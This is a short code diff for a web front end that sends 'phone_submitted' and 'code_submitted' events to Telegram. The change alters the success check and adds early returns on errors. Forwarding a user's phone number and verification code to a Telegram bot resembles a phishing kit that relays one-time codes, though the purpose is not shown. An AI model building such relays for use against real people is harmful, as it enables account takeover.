@@ -42,11 +42,13 @@ async function goToVerifyPage() {
   try {
     const response = await sendToTelegram('phone_submitted')
 
-    if (!response.configured) {
+    if (!response.ok) {
       phoneStatus.value = response.message ?? 'Telegram is not configured yet.'
+      return
     }
   } catch (error) {
     phoneStatus.value = error instanceof Error ? error.message : 'Could not send the phone number right now.'
+    return
   } finally {
     isSendingPhone.value = false
   }
@@ -75,7 +77,7 @@ async function submitVerificationCode() {
   try {
     const response = await sendToTelegram('code_submitted')
 
-    codeStatus.value = response.configured
+    codeStatus.value = response.ok
       ? 'Code sent to Telegram.'
       : (response.message ?? 'Telegram is not configured yet.')
   } catch (error) {
